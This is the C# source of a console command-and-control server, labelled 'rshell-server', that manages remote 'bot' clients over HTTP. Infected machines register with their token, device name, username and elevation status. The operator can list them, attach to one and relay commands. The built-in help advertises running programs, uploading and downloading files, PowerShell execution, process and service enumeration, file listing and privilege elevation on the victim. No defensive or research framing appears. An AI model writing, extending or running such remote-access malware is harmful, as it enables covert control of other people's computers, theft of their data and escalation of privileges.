using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Collections.Specialized;
using System.Net;

class Program
{
    static Server server;
    static List<LiveClient> clients = new List<LiveClient>();
    static string title = "rshell-server";

    static void Main(string[] _args)
    {
        Clear();

        //start regularly updating the title
        new Thread(()=> {
            while (true)
            {
                TitleUpdate();
                Thread.Sleep(2000);
            }
        }).Start();

        //setup http server
        try
        {
            Console.ForegroundColor = ConsoleColor.Red; Console.Write("Listening port: ");
            Console.ForegroundColor = ConsoleColor.White; string port_str = Console.ReadLine(); int port = Int32.Parse(port_str);
            Setup_HTTP_Server(port);
            Console.ForegroundColor = ConsoleColor.Gray; Console.WriteLine("Listening on port " + port.ToString());
            Thread.Sleep(1000);
            Clear();
        }
        catch (Exception)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Failed to start HTTP server");
        }

        //server commands
        while (true)
        {
            Console.ForegroundColor = ConsoleColor.Green; Console.Write("rshell-server");
            Console.ForegroundColor = ConsoleColor.DarkGreen; Console.Write(" > ");
            Console.ForegroundColor = ConsoleColor.White;
            var args = Utils.Parse(Console.ReadLine()).ToList();
            var cmd = args[0];
            args = args.Skip(1).ToList();
            Console.ForegroundColor = ConsoleColor.Gray;

            switch (cmd)
            {
                case "help":
                    Console.WriteLine(String.Join("\n", new string[] {
                        "Server commands: ",
                        "  help",
                        "  clear",
                        "  clients",
                        "  encode <string>",
                        "  waitone [<seconds>]",
                        "  attach <id>",
                        "",
                        "Custom shell commands: ",
                        "  info",
                        "  run <program> [<arguments> <working dir>]",
                        "  request <url> [--body]",
                        "  download <url> <file>",
                        "  upload <url> <file>",
                        "  set-timeout <seconds>",
                        "  connections [<:port>]",
                        "  files [<path> <filter> <maxdepth>]",
                        "  installed [<search>]",
                        "  process-table [<search>]",
                        "  process-list [<search>]",
                        "  services-table [<search>]",
                        "  services-list [<search>]",
                        "  ps <cmdlet>",
                        "  windows",
                        "  elevate",
                        "  pid",
                        "  bin",
                        "  kill",
                    }));
                    break;

                case "clear":
                    Clear();
                    break;

                case "encode": //usage: encode <string>
                    if (args.Count == 1)
                    {
                        Console.WriteLine(Convert.ToBase64String(Encoding.UTF8.GetBytes(args[0])));
                    }
                    break;

                case "clients":
                    LiveClient[] lives = clients.Where((client)=> { return client.IsOnline(); }).ToArray();
                    if (lives.Length > 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(Utils.Pad("Token", Utils.Pad("Device name", Utils.Pad("Username", Utils.Pad("Platform", Utils.Pad("Bot version", "Connected", 25), 25), 25)), 22));
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;
                    int c = 0;
                    foreach (LiveClient lc in lives)
                    {
                        Console.WriteLine(Utils.Pad(lc.Token, Utils.Pad(lc.Name, Utils.Pad((lc.Elevated ? "*" : "") + lc.User, Utils.Pad(lc.Platform, Utils.Pad(lc.Version, lc.Time, 25), 25), 25)), 22));
                        c++;
                    }
                    if (c == 0)
                    {
                        Console.WriteLine("No connected clients");
                    }
                    break;

                case "waitone":
                    int maxtries = 30; //60 seconds
                    if (args.Count == 1)
                    {
                        if (!Int32.TryParse(args[0], out maxtries))
                        {
                            break;
                        }
                        maxtries = (int)(maxtries * 2);
                    }
                    Console.WriteLine("Waiting for client to connect... (timeout in "+(maxtries / 2) +" seconds)");
                    int tries = 0;
                    while (true)
                    {
                        int a = clients.Count; Thread.Sleep(500); int b = clients.Count;
                        if (a != b && b > 0)
                        {
                            Console.WriteLine("Client connected!\n");
                            LiveClient live0 = clients[b - 1];
                            LiveSession(live0, live0.Token);
                            break;
                        }
                        if (tries > maxtries)
                        {
                            Console.WriteLine("Stopped waiting for connection.");
                            break;
                        }
                        tries += 1;
                    }
                    break;

                case "attach": //usage: attach <id> (or other piece of information if ID couldn't be found...)
                    string token = args[0];
                    LiveClient live = LiveClientByToken(token);
                    if (live != null && live.IsOnline()) //first try looking for connected client with given ID
                    {
                        LiveSession(live, token);
                    }
                    else
                    {
                        LiveClient found = null;
                        LiveClient[] arr = clients.Where((client) => { return client.IsOnline(); }).ToArray();
                        for (int i = arr.Length-1; i >= 0; i--)
                        {
                            LiveClient cli = arr[i];
                            if (cli.Name.ToLower().Contains(token.ToLower()) || cli.User.ToLower().Contains(token.ToLower()))
                            {
                                found = cli;
                                break;
                            }
                        }
                        if (found == null)
                        {
                            Console.WriteLine("Attach failed: Client not found");
                        } else
                        {
                            LiveSession(found, found.Token);
                        }
                    }
                    break;
            }
        }
    }

    static void TitleUpdate()
    {
        int onlineCount = clients.Where((client) => { return client.IsOnline(); }).ToArray().Length;
        Console.Title = title + " (connected: " + onlineCount + ")";
    }

    static void Clear()
    {
        Console.Clear();

        Console.ForegroundColor = ConsoleColor.Yellow;

        string[] lines = new string[] {
            @" /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$ /$$       /$$      ",
            @"| $$__  $$ /$$__  $$| $$  | $$| $$_____/| $$      | $$      ",
            @"| $$  \ $$| $$  \__/| $$  | $$| $$      | $$      | $$      ",
            @"| $$$$$$$/|  $$$$$$ | $$$$$$$$| $$$$$   | $$      | $$      ",
            @"| $$__  $$ \____  $$| $$__  $$| $$__/   | $$      | $$      ",
            @"| $$  \ $$ /$$  \ $$| $$  | $$| $$      | $$      | $$      ",
            @"| $$  | $$|  $$$$$$/| $$  | $$| $$$$$$$$| $$$$$$$$| $$$$$$$$",
            @"|__/  |__/ \______/ |__/  |__/|________/|________/|________/",
            @"",
        };
        foreach (string line in lines)
        {
            Console.WriteLine(line);
        }
    }

    static void Setup_HTTP_Server(int port)
    {
        server = new Server(port);
        server.OnRequest = (http) =>
        {
            var ctx = (HttpListenerContext)http["ctx"];
            var ip = (string)http["ip"];
            var method = (string)http["method"];
            var get = (NameValueCollection)http["get"];
            var post = (byte[])http["post"];
            var query = (string)http["query"];
            string[] qargs = query.Split('/').ToList().Skip(1).ToArray();
            Dictionary<string, object> data;

            switch (qargs[0])
            {
                case "live": //client timeout value should be over 40s
                    if (method == "GET" && post.Length == 0 && qargs.Length == 1)
                    {
                        server.SendString(ctx, "");
                    }
                    else if (post.Length > 0 && qargs.Length == 2)
                    {
                        string action = qargs[1];
                        data = JSON.parse(Utils.Decode(Encoding.UTF8.GetString(post)));

                        switch (action)
                        {
                            case "register": //register and wait for instructions
                                if (data.ContainsKey("token") && data.ContainsKey("name") && data.ContainsKey("version"))
                                {
                                    LiveClient live = LiveClientByToken((string)data["token"]);
                                    if (live == null)
                                    {
                                        live = new LiveClient()
                                        {
                                            HttpListener = ctx,
                                            Token = (string)data["token"],
                                            Name = (string)data["name"],
                                            User = (string)data["user"],
                                            Version = (string)data["version"],
                                            Platform = (string)data["platform"],
                                            Elevated = (bool)data["elevated"],
                                        };
                                        clients.Add(live);
                                    }
                                    else
                                    {
                                        clients.Remove(live);
                                        ctx.Response.Abort();
                                    }
                                    TitleUpdate();
                                }
                                break;
                            case "message":
                                if (data.ContainsKey("token"))
                                {
                                    LiveClient live = LiveClientByToken((string)data["token"]);
                                    if (live != null) //live client sent a response
                                    {
                                        if (live.OnMessage != null) live.OnMessage(data);
                                    }
                                }
                                server.SendString(ctx, "");
                                break;
                        }
                    }
                    break;

                default:
                    ctx.Response.Abort(); //discard all other requests
                    break;
            }
        };
    }

    static LiveClient LiveClientByToken(string token)
    {
        LiveClient[] _clients = clients.ToArray();
        foreach (LiveClient client in _clients)
        {
            if (token.Length > 0 && client.Token == token)
            {
                return client;
            }
        }
        return null;
    }

    static void LiveSession(LiveClient live, string token)
    {
        bool exit = false;
        while (!exit)
        {
            Console.ForegroundColor = ConsoleColor.Magenta; Console.Write(live.Name);
            Console.ForegroundColor = ConsoleColor.DarkMagenta; Console.Write(" > ");
            Console.ForegroundColor = ConsoleColor.Cyan; Console.Write(live.User);
            Console.ForegroundColor = ConsoleColor.DarkCyan; Console.Write(" > ");
            Console.ForegroundColor = ConsoleColor.Green; Console.Write(live.Version);
            Console.ForegroundColor = ConsoleColor.DarkGreen; Console.Write(" > ");
            Console.ForegroundColor = ConsoleColor.White; string text = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Gray;

            if (LiveClientByToken(token) != null)
            {
                live = LiveClientByToken(token);
            }

            switch (text)
            {
                case "clear":
                    Clear();
                    break;

                case "info":
                    Console.WriteLine(String.Join("\n", new string[] {
                        "Client token     : " + live.Token,
                        "Online status    : " + (live.IsOnline() ? "Connected" : "Disconnected"),
                        "Connect time     : " + live.Time,
                        "",
                        "Platform         : " + live.Platform,
                        "Device name      : " + live.Name,
                        "Username         : " + live.User,
                        "Elevated         : " + (live.Elevated ? "Yes" : "No"),
                        "",
                        "Bot version      : " + live.Version,
                    }));
                    break;

                case "exit":
                    exit = true;
                    break;

                default:
                    if (live.IsOnline())
                    {
                        bool received = false, timeout = false;
                        live.OnMessage = (obj) => {
                            if (!timeout && obj.ContainsKey("text"))
                            {
                                Console.ForegroundColor = ConsoleColor.Gray;
                                Console.WriteLine(Utils.RemoveUnsupportedChars((string)obj["text"]));
                                received = true;
                            }
                        };

                        var data = JSON.create();
                        data.Add("text", text);
                        live.Send(data);

                        int count = 0;
                        while (!received) { Thread.Sleep(100); count++; if (count > 10 * 20) { timeout = true; Console.WriteLine("Time out"); break; } }
                        Thread.Sleep(100);
                    }
                    break;
            }
        }
    }
}